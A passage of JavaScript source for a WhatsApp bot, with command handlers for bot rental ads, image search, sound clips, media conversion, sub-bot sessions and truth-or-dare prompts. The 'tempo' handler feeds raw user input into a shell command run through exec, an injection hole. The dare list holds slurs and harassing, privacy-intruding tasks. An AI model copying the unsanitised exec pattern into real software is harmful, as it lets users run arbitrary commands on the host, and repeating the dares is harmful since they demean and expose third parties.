 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `Hai Sir ${pushname}, Mau sewa Bot Kami ?, Lihat dan pilih, Klik Link Di bawah foto nya ya` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "*- 1 Minggu -*\n• Price: 8k\n• Akses: Premium\n\n• Discount: 5k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6283123448708?text=Bang+Mau+Sewa+Bot+Veemon+Md+1+Minggu","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "*- 3 Minggu -*\n• Price: 15k\n• Akses: Premium\n\n• Discount: 10k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6283123448708?text=Bang+Mau+Sewa+Bot+Veemon+Md+3+Minggu","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
body: { text: "*- 2 Bulan -*\n• Price: 31k\n• Akses: Premium\n\n• Discount: 24k For Next Buy" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"Sewa","url":"https://wa.me/6283123448708?text=Bang+Mau+Sewa+Bot+Veemon+Md+2+bulan","webview_presentation":null}',
 },
 ],
 },
 },
 
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
}
break

case 'npmstalk':{
if (!q) return reply(`Example ${prefix+command} xeonapi`)
await loading()
let npmstalk = require('./lib/scraper')
eha = await npmstalk.npmstalk(q)
reply(`*/ Npm Stalker \\*

Name : ${eha.name}
Version Latest : ${eha.versionLatest}
Version Publish : ${eha.versionPublish}
Version Update : ${eha.versionUpdate}
Latest Dependencies : ${eha.latestDependencies}
Publish Dependencies : ${eha.publishDependencies}
Publish Time : ${eha.publishTime}
Latest Publish Time : ${eha.latestPublishTime}`)
}
break
case 'ffstalk':{
if (!q) return reply(`Example ${prefix+command} 946716486`)
await loading()
let ffstalk = require('./lib/scraper')
eeh = await ffstalk.ffstalk(`${q}`)
reply(`*/ Free Fire Stalker \\*

Id : ${eeh.id}
Nickname : ${eeh.nickname}`)
}
break 

case "pin": case "pintesert": {
if (!text) return reply("Input Query")
try  {

const res = await (await fetch(`https://widipe.com/pinimg?query=${text}`)).json();

const url1 = `${res.result[1]}`;
const url2 = `${res.result[2]}`;
const url3 = `${res.result[3]}`;
const url4 = `${res.result[4]}`;
const url5 = `${res.result[5]}`;


async function image(url) {
 const { imageMessage } = await generateWAMessageContent({
 image: { url }
 }, {
 upload: ptz.waUploadToServer
 });
 return imageMessage;
}

let msg = generateWAMessageFromContent(
 m.chat,
 {
 viewOnceMessage: {
 message: {
 interactiveMessage: {
 body: { text: `Hai Sir ${pushname}, berikut 5 foto dari Pinterest yang anda cari` },
 carouselMessage: {
 cards: [
 {
 header: {
 imageMessage: await image(url1),
 hasMediaAttachment: true,
 },
 body: { text: "Image 1/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url2),
 hasMediaAttachment: true,
 },
 body: { text: "Image 2/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url3),
 hasMediaAttachment: true,
 },
 body: { text: "Image 3/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url4),
 hasMediaAttachment: true,
 },
 body: { text: "Image 4/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 {
 header: {
 imageMessage: await image(url5),
 hasMediaAttachment: true,
 },
 body: { text: "Image 5/5" },
 nativeFlowMessage: {
 buttons: [
 {
 name: "cta_url",
 buttonParamsJson: '{"display_text":"CLICK HERE","url":"https://widipe.com","webview_presentation":null}',
 },
 ],
 },
 },
 ],
 messageVersion: 1,
 },
 },
 },
 },
 },
 {}
);

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id,
});
    } catch(e) {
        reply("Cari Yg lain..")
        }
}
break

    
    
    
    
    
    
    
    
    
    
    
    
    
    
 case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
case 'mangkane1':
case 'mangkane2':
case 'mangkane3':
case 'mangkane4':
case 'mangkane5':
case 'mangkane6':
case 'mangkane7':
case 'mangkane8':
case 'mangkane9':
case 'mangkane10':
case 'mangkane11':
case 'mangkane12':
case 'mangkane13':
case 'mangkane14':
case 'mangkane15':
case 'mangkane16':
case 'mangkane17':
case 'mangkane18':
case 'mangkane19':
case 'mangkane20':
case 'mangkane21':
case 'mangkane22':
case 'mangkane23':
case 'mangkane24':
case 'mangkane25':
case 'mangkane26':
case 'mangkane27':
case 'mangkane28':
case 'mangkane29':
case 'mangkane30':
case 'mangkane31':
case 'mangkane32':
case 'mangkane33':
case 'mangkane34':
case 'mangkane35':
case 'mangkane36':
case 'mangkane37':
case 'mangkane38':
case 'mangkane39':
case 'mangkane40':
case 'mangkane41':
case 'mangkane42':
case 'mangkane43':
case 'mangkane44':
case 'mangkane45':
case 'mangkane46':
case 'mangkane47':
case 'mangkane48':
case 'mangkane49':
case 'mangkane50':
case 'mangkane51':
case 'mangkane52':
case 'mangkane53':
case 'mangkane54':
case 'acumalaka':
case 'reza-kecap':
case 'farhan-kebab':
case 'omaga':
case 'kamu-nanya':
case 'anjay':
case 'siuu':
viot = 'https://telegra.ph/file/2c1f6c598eab67b0f8ffa.jpg'
thumb = 'https://telegra.ph/file/2c1f6c598eab67b0f8ffa.jpg'
let sound
if (/sound/.test(command)) sound = `https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') < 25) sound = `https://raw.githubusercontent.com/hyuura/Rest-Sound/main/HyuuraKane/${command}.mp3`
if (/mangkane/.test(command) && command.replace('mangkane', '') > 24) sound = `https://raw.githubusercontent.com/aisyah-rest/mangkane/main/Mangkanenya/${command}.mp3`
if (/acumalaka|reza-kecap|farhan-kebab|omaga|omaga|kamu-nanya|anjay|siuu/.test(command)) sound = `https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`
if (text.toLowerCase() === 'thumb') {
await ptz.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false, 
contextInfo: {
externalAdReply: {
mediaUrl: 'https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L', 
mediaType: 2, 
title: '  ⇆ㅤ ||◁ㅤ❚❚ㅤ▷||ㅤ ↻  ', 
body: '  ━━━━⬤──────────  ', 
description: 'Now Playing...',
mediaType: 2, 
sourceUrl: 'https://whatsapp.com/channel/0029VaeRru3ADTOEKPCPom0L',
thumbnail: await (await fetch(viot)).buffer(), 
renderLargerThumbnail: true}}}, {quoted: m})
} else await Finisher.sendMessage(m.chat, {audio: {url: sound}, mimetype: 'audio/mpeg', ptt: false}, {quoted: m})
break   
    
    
    
    
    
    
    
case 'delcase': {
 if (!isCreator) return reply('Only the creator can delete a case..');
 if (!text) return reply('Which case do you want to delete?');

 // Nama file yang akan dimodifikasi
 const namaFile = './message.js';

 // Case yang ingin Anda hapus
 const caseToDelete = `case '${text}':`;

 // Baca isi file
 fs.readFile(namaFile, 'utf8', (err, data) => {
 if (err) {
 console.error('An error occurred while reading the file:', err);
 return reply('An error occurred while reading the file..');
 }
const posisiCase = data.indexOf(caseToDelete);
 if (posisiCase === -1) {
 return reply(`Case '${args}' not found in file.`);
 }

 // Cari posisi break; berikutnya seAlready case
 const posisiBreak = data.indexOf('break;', posisiCase);
 if (posisiBreak === -1) {
 return reply('Could not find "break;" Already case you want to delete.');
 }

 // Potong data untuk deleting case
 const kodeBaruLengkap = data.slice(0, posisiCase) + data.slice(posisiBreak + 'break;'.length);
fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
 if (err) {
 console.error('An error occurred while writing the file:', err);
 return reply('An error occurred while writing the file.');
 } else {
 return reply(`Case '${text}' Succeed deleted.`);
 }
 });
 });
    }
 break;
    
    
  case "tomp4":
            case "tovideo1":
                {
                    if (!/webp/.test(mime))
                        return reply(
                            `Reply sticker with caption *${prefix + command}*`
                        );
                    reply('`wait`');
                    let media =
                        await ptz.downloadAndSaveMediaMessage(qmsg);
                    let webpToMp4 = await webp2mp4File(media);
                    await ptz.sendMessage(
                        m.chat,
                        {
                            video: {
                                url: webpToMp4.result,
                                caption: "Convert Webp To Video"
                            }
                        },
                        {
                            quoted: m
                        }
                    );
                    await fs.unlinkSync(media);
                }
                break;  
    
    

      case 'tempo': {
        
        if (!args.join(" ")) return reply(`Example: ${prefix + command} 10`)
        var req = args.join(' ')
        media = await ptz.downloadAndSaveMediaMessage(quoted, "tempo")
        if (isQuotedAudio) {
          ran = getRandom('.mp3')
          exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            hah = fs.readFileSync(ran)
            ptz.sendMessage(from, { audio: hah, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
            fs.unlinkSync(ran)
          })
        } else if (isQuotedVideo) {
          ran = getRandom('.mp4')
          exec(`ffmpeg -i ${media} -filter:a "atempo=1.0,asetrate=${req}" ${ran}`, (err, stderr, stdout) => {
            fs.unlinkSync(media)
            if (err) return reply('Error!')
            hah = fs.readFileSync(ran)
            ptz.sendMessage(from, { video: hah, mimetype: 'video/mp4' }, { quoted: m })
            fs.unlinkSync(ran)
          })
        } else {
          reply("Please send video/audio file only!")
        }
      }
        break;
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
 

case 'diffusion':
try {
 const hua = await fetchJson(`https://skizo.tech/api/sdxl?apikey=${global.skizo}&prompt=${text}`)
let huaa = hua.url

ptz.sendMessage(m.chat, {image: huaa, caption: `${text}`},{quoted:fsaluran})
} catch (err) {
reply('Error!!!')
}
break

//=================================================//                

case "gpt4": 
if (!text) return reply('What do you want to ask, bro??')
try {
let cct = await fetchJson(`https://widipe.com/gpt4?text=${text}`)
let resq = cct.result
reply(`${resq}`)
} catch (err) {
reply('Website error')
}
break

case 'totalfeature':
 case 'totalfitur': 
 case 'totalcmd': 
 case 'totalcommand': 
reply(`${totalfitur}`)
break

case "diffusion": 
if (!text) return reply('Apa ya..')
 const rest = await (await fetch(`https://widipe.com/stablediffusion?text=${text}`))

ptz.sendMessage(m.chat,{image: rest, caption: `${text}`},{quoted:fsaluran})
break

case "tts-anime":
if (!text) return reply('Love the Spelling Let the Tts Go to the Meaning The question doesnt support Indonesia, Example: Che-pe-tan pai-mon lah-gee nung-goo nee, mow nah nya ahpa ?')

 let restts = await fetchJson(`https://skizo.tech/api/tts-anime?apikey=${global.skizo}&text=${text}&lang=japanese&voice=paimon&speed=0.9&symbol=y`)
let Veemonn = restts.data.url_voice
ptz.sendMessage(m.chat, { audio: { url: Veemonn }, fileName: `tts.mp3`, mimetype: 'audio/mp4' })
break

case 'ss': case 'ssweb':{ 
if (!/^https?:\/\//.test(text)) return reply('Originally *URL* with http:// or https://')

 let tekss99997 = `*QUEEN_ANITA-V3*`
let krt = await ssweb(text)
//throw listMessage.sections[0].rows

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
 	mentionedJid: [m.sender], 
 	isForwarded: false, 
	businessMessageForwardInfo: { businessOwnerJid: ptz.decodeJid(ptz.user.id) },
 externalAdReply: { 
 title: 'David Cyril', 
 thumbnailUrl: 'https://imgur.com/a/PD8nT5X', 
 sourceUrl: '',
 mediaType: 2,
 renderLargerThumbnail: false
 }
 }, 
 body: 
proto.Message.InteractiveMessage.Body.create({
 text: tekss99997
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Success •`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: ``,
 subtitle: "David Cyril",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: krt.result }, { upload: ptz.waUploadToServer }))
 }),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [
{
 "name": "cta_copy",
 "buttonParamsJson": "{\"display_text\":\"Copy Url Web\",\"id\":\"123456789\",\"copy_code\":\"Www.Zio-Ganteng.coy.my.id\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await ptz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})
}
break

case 'stop-anita':
 if (!isCreator) return reply("*`Especially for my owner sir`*")

 const folderPath = `./session2/jadibot/${frommeky}`; 

 if (!fs.existsSync(folderPath)) {
 return reply("*`You're Not a Bot Yet`*");
 }

 try {
 fs.rmSync(folderPath, { recursive: true, force: true });
 reply('Session Already deleted.');
 } catch (error) {
 reply('Error :', error);
 }
 break
 
 
 case 'vietnamese':{
await loading() 
var notnot = JSON.parse(fs.readFileSync('./david-media/tiktokpics/vietnam.json'))
var hasil = pickRandom(notnot)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}
_*Here is the result of: ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'QUEEN_ANITA-V3'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url: hasil.url } }, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix + command}\"}`
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
} 
break

 case 'list-anita': 
if (!isCreator) return reply("*`Especially for my owner sir`*")
try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
te = "*-- List Jadibot --*\n\n"
for (let i of user){
y = await ptz.decodeJid(i.id)
te += " •• User : @" + y.split("@")[0] + "\n"
te += " •• Name : " + i.name + "\n\n"
}
ptz.sendMessage(from,{text:te,mentions: [y], },{quoted:m})
} catch (err) {
reply(`No user has become a bot yet`)
}
break 






case "start-anita":
 if (!isCreator) return reply("*`Especially for my owner sir`*")

try {
let user = [... new Set([...global.conns.filter(danzz => danzz.user).map(danzz => danzz.user)])]
await jadibot(ptz, text, m, frommeky)
} catch (err) {
reply(`No user has become a bot yet`)
}
break

case 'dare':{
              const dare =[
    "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
    "spill people who make you pause",
    "call crush/pickle now and send ss",
    "drop only emote every time you type on gc/pc for 1 day.",
    "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
    "call ex saying miss",
    "sing the chorus of the last song you played",
    "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
	"Bang on the table (which is at home) until you get scolded for being noisy",
    "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
    "mention ex's name",
    "make 1 rhyme for the members!",
    "send ur whatsapp chat list",
    "chat random people with gheto language then ss here",
    "tell your own version of embarrassing things",
    "tag the person you hate",
    "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
    "change name to *I AM DONKEY* for 24 hours",
    "shout *ma chuda ma chuda ma chuda* in front of your house",
    "snap/post boyfriend photo/crush",
    "tell me your boyfriend type!",
    "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
    "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
    "prank chat ex and say *i love u, please come back.* without saying dare!",
    "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
    "change the name to *I am a child of randi* for 5 hours",
    "type in bengali 24 hours",
    "Use selmon bhoi photo for 3 days",
    "drop a song quote then tag a suitable member for that quote",
    "send voice note saying can i call u baby?",
    "ss recent call whatsapp",
    "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
    "pop to a group member, and say fuck you",
    "Act like a chicken in front of ur parents",
    "Pick up a random book and read one page out loud in vn n send it here",
    "Open your front door and howl like a wolf for 10 seconds",
    "Take an embarrassing selfie and paste it on your profile picture",
    "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
    "Walk on your elbows and knees for as long as you can",
    "sing national anthem in voice note",
    "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
    "Tell the saddest story you know",
    "make a twerk dance video and put it on status for 5mins",
    "Eat a raw piece of garlic",
    "Show the last five people you texted and what the messages said",
    "put your full name on status for 5hrs",
    "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
    "call ur bestie, bitch",
    "put your photo without filter on ur status for 10mins",
    "say i love oli london in voice noteðŸ¤£ðŸ¤£",
    "Send a message to your ex and say I still like you",
    "call Crush/girlfriend/bestie now and screenshot here",
    "pop to one of the group member personal chat and Say you ugly bustard",
    "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
    "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
    "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
    "use any bollywood actor photo as ur pfp for 3 days",
    "put your crush photo on status with caption, this is my crush",
    "change name to I AM GAY for 5 hours",
    "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
    "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
    "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
    "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
    "shout bravooooooooo and send here through voice note",
    "snap your face then send it here",
    "Send your photo with a caption, i am lesbian",
    "shout using harsh words and send it here through vn",
    "shout you bastard in front of your mom/papa",
    "change the name to i am idiot for 24 hours",
    "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
    "say i love the bot owner xeon through voice note",
    "send your gf/bf pic here",
    "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
    "breakup with your best friend for 5hrs without telling him/her that its a dare",
     "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
     "say i love depak kalal through voice note",
     "write i am feeling horny and put it on status, u can delete it only after 5hrs",
     "write i am lesbian and put it on status, u can delete only after 5hrs",
     "kiss your mommy or papa and say i love youðŸ˜Œ",
     "put your father name on status for 5hrs",
     "send abusive words in any grup, excepting this grup, and send screenshot proof here"
]
              const xeondare = dare[Math.floor(Math.random() * dare.length)]
              bufferdare = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose DARE_\n\n'+ xeondare
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}dare"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
}
              break
              
              
 case 'truth':{
              const truth =[
    "Have you ever liked anyone? How long?",
    "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
    "apa ketakutan terbesar kamu?",
    "Have you ever liked someone and felt that person likes you too?",
    "What is the name of your friend's ex-girlfriend that you used to secretly like?",
    "Have you ever stolen money from your father or mom? The reason?",
    "What makes you happy when you're sad?",
    "Ever had a one sided love? if so who? how does it feel bro?", 
    "been someone's mistress?",
    "the most feared thing",
    "Who is the most influential person in your life?",
    "what proud thing did you get this year", 
    "Who is the person who can make you awesome", 
    "Who is the person who has ever made you very happy?", 
    "Who is closest to your ideal type of partner here", 
    "Who do you like to play with??", 
    "Have you ever rejected people? the reason why?",
    "Mention an incident that made you hurt that you still remember", 
    "What achievements have you got this year??",
    "What's your worst habit at school??",
    "What song do you sing most in the shower",
    "Have you ever had a near-death experience",
    "When was the last time you were really angry. Why?",
    "Who is the last person who called you",
    "Do you have any hidden talents, What are they",
    "What word do you hate the most?",
    "What is the last YouTube video you watched?",
    "What is the last thing you Googled",
    "Who in this group would you want to swap lives with for a week",
    "What is the scariest thing thats ever happened to you",
    "Have you ever farted and blamed it on someone else",
    "When is the last time you made someone else cry",
    "Have you ever ghosted a friend",
    "Have you ever seen a dead body",
    "Which of your family members annoys you the most and why",
    "If you had to delete one app from your phone, which one would it be",
    "What app do you waste the most time on",
    "Have you ever faked sick to get home from school",
    "What is the most embarrassing item in your room",
    "What five items would you bring if you got stuck on a desert island",
    "Have you ever laughed so hard you peed your pants",
    "Do you smell your own farts",
    "have u ever peed on the bed while sleeping ??",
    "What is the biggest mistake you have ever made",
    "Have you ever cheated in an exam",
    "What is the worst thing you have ever done",
    "When was the last time you cried",
    "whom do you love the most among ur parents", 
    "do u sometimes put ur finger in ur nosetril?", 
    "who was ur crush during the school days",
    "tell honestly, do u like any boy in this grup",
    "have you ever liked anyone? how long?",
    "do you have gf/bf','what is your biggest fear?",
    "have you ever liked someone and felt that person likes you too?",
    "What is the name of your ex boyfriend of your friend that you once liked quietly?",
    "ever did you steal your mothers money or your fathers money",
    "what makes you happy when you are sad",
    "do you like someone who is in this grup? if you then who?",
    "have you ever been cheated on by people?",
    "who is the most important person in your life",
    "what proud things did you get this year",
    "who is the person who can make you happy when u r sad",
    "who is the person who ever made you feel uncomfortable",
    "have you ever lied to your parents",
    "do you still like ur ex",
    "who do you like to play together with?",
    "have you ever stolen big thing in ur life? the reason why?",
    "Mention the incident that makes you hurt that you still remember",
    "what achievements have you got this year?",
    "what was your worst habit at school?",
    "do you love the bot creator, xeon?ðŸ¤£",
    "have you ever thought of taking revenge from ur teacher?",
    "do you like current prime minister of ur country",
    "you non veg or veg",
    "if you could be invisible, what is the first thing you would do",
    "what is a secret you kept from your parents",
    "Who is your secret crush",
    "whois the last person you creeped on social media",
    "If a genie granted you three wishes, what would you ask for",
    "What is your biggest regret",
    "What animal do you think you most look like",
    "How many selfies do you take a day",
    "What was your favorite childhood show",
    "if you could be a fictional character for a day, who would you choose",
    "whom do you text the most",
    "What is the biggest lie you ever told your parents",
    "Who is your celebrity crush",
    "Whats the strangest dream you have ever had",
    "do you play pubg, if you then send ur id number"
]
              const xeontruth = truth[Math.floor(Math.random() * truth.length)]
              buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '_You choose TRUTH_\n\n'+ xeontruth
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: 'ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅᴀᴠɪᴅ ᴄʏʀɪʟ ᴛᴇᴄʜ'
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: bufferdare}, { upload: ptz.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"PLAY AGAIN 🤔\",\"id\":\"${prefix}truth"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '',
                  newsletterName: '',
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await ptz.relayMessage(m.chat, msgs.message, {})
}
              break              


case 'kill':case 'pat':case 'lick':case 'bite':case 'yeet':case 'bonk':case 'wink':case 'poke':case 'nom':case 'slap':case 'smile':case 'wave':case 'blush':case 'smug':case 'glomp':case 'happy':case 'dance':case 'cringe':case 'highfive':case 'handhold':
 axios.get(`https://api.waifu.pics/sfw/${command}`)
.then(({data}) => {
     ptz.sendImageAsSticker(m.chat, data.url, m, { packname: `${global.packname}`, author: `${global.author}`})
     
     })
break


case 'antilink1': case 'antimenu': case 'antilinkmenu1':
if (!isGroup) return
try {
 let sections = [{
		title: '- Anti Menu Selection -', 
		rows: [{
	 title: 'Antilink All [ ON ]',
 	description: `<!> Enable Feature •`, 
 	id: `${prefix}antilinkall on`
 }, 
{
 title: 'Antilink All [ OFF ]',
 description: "<!> Disable Feature",
 id: `${prefix}antilinkall off`
 },
 {
 title: 'Antilink Group [ ON ]',
 description: "<!> Enable Feature",
 id: `${prefix}antilinkgc on`
 },
 {
